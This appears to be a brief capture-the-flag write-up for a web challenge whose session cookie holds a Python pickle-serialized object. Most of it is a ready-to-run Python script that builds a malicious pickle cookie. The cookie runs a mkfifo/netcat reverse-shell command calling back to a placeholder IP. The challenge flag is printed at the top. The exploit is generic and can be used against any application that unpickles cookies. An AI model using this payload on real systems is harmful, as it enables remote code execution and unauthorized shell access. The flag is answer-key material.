Flag Proof:`CTF{ccc1ccef217ed19c492bdada049ad2b0fbf1adcb72a92f13ab153aae068f797f}`

## Summary

- Going to the page , we get redirected to `dashboard` , and this redirection sets the cookie to what turned out to be a pickle serialized object which is known to be vulnerable to `RCE`.
- Used this script to create my cookie which would give me a reverse shell and get the flag

```python
import pickle
import sys
import base64

COMMAND = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ip> 9000 >/tmp/f"

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print (base64.b64encode(pickle.dumps(PickleRce())))
```
